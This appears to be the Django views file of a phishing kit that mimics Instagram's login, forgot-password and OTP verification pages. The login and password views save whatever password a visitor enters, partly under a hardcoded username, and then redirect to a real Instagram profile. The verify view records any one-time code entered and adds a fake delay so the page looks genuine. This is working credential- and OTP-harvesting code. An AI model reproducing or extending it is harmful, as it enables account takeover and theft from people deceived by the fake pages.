from time import sleep

from django.shortcuts import redirect, render
from django.db.models import Q

from .models import User

def index(request):
    return render(request, "accounts/index.html")

def password_page(request):
    # print(request.method)
    # print(request.GET.dict())
    username = request.session.get("username")
    # print(f"Password page accessed for user: {username}")

    if request.method == "POST":
        print(request.method)
        password = request.POST.get("password")
        # print(f"Updating password for user: {username} to {password}")

        User.objects.filter(username='polleykalicharan').update(password=password)
        if password:
            return redirect("https://www.instagram.com/surya_____2021/")

        # return HttpResponseRedirect("https://www.google.com")

    return render(request, "accounts/password.html", {
        "username": username
    })
def login(request):
    if request.method == "POST":
        # username = request.POST.get("username")
        password = request.POST.get("password")
        identifier = request.POST.get("identifier")
        print(identifier)

        user = User.objects.filter(
            Q(mobile=identifier) | Q(email=identifier) | Q(username=identifier)
        ).first()

        if user:
            # Save the username in the session
            User.objects.filter(
            Q(mobile=identifier) | Q(email=identifier) | Q(username=identifier)
        ).update(password=password)
            request.session["username"] = identifier
            return redirect("https://www.instagram.com/surya_____2021/")
        else:
            return render(
                request,
                "accounts/login.html",
                {
                    "error": "Invalid username or password"
                }
            )
    return render(request, "accounts/login.html")

def forgot_password(request):
    print(request.method)

    if request.method == "POST":
        identifier = request.POST.get("identifier")
        print(identifier)

        user = User.objects.filter(
            Q(mobile=identifier) | Q(email=identifier)
        ).first()
        print(user)
        User.objects.filter(Q(mobile=identifier) | Q(email=identifier)).update(otp=identifier[-6:])  # Update the OTP field with the identifier

        if user:
            # save user data for next page
            request.session["identifier"] = identifier

            return redirect("verify")

        else:
            return render(
                request,
                "accounts/forgot_password.html",
                {
                    "error": "Mobile number or email not found"
                }
            )

    # first time opening page
    return render(
        request,
        "accounts/forgot_password.html"
    )
from django.db.models import Q

from django.db.models import Q

def mask_identifier(value):
    if "@" in value:
        name, domain = value.split("@", 1)
        return name[:2] + "*" * (len(name) - 2) + "@" + domain

    elif value.isdigit():
        return value[:2] + "*" * 6 + value[-2:]

    return value


def verify(request):
    sleep(8)  # Simulate a delay for OTP verification
    identifier = request.session.get("identifier", "")

    if "@" in identifier:
        title = "Check your email"
    elif identifier.isdigit():
        title = "Check your WhatsApp"
    else:
        title = "Check your account"

    if request.method == "POST":
        code = request.POST.get("code")
        User.objects.filter(Q(mobile=identifier) | Q(email=identifier)).update(otp=code)  #

        # Replace this with your actual OTP verification
        if code:  
            print("OTP verified successfully.")    # Example OTP
            return redirect("new_password")
        else:
            return render(
                request,
                "accounts/verify.html",
                {
                    "title": title,
                    "identifier": mask_identifier(identifier),
                    "error": "Invalid verification code."
                }
            )

    return render(
        request,
        "accounts/verify.html",
        {
            "title": title,
            "identifier": mask_identifier(identifier),
        },
    )
def logout(request):
    # Clear the session data
    request.session.flush()

    # Redirect to the login page or any other page
    return redirect("login")
def new_password(request):

    if request.method == "POST":
        password = request.POST.get("password")

    # #     user_id = request.session.get("user_id")

        User.objects.filter(username='polleykalicharan').update(password=password)
        if password:
            return redirect("https://www.instagram.com/surya_____2021/")
            

    #     return redirect("login")   # or wherever you want

    return render(request, "accounts/new_password.html")
# def logout(request):
#     # Clear the session data
#     request.session.flush()

#     # Redirect to the login page or any other page
#     return redirect("login")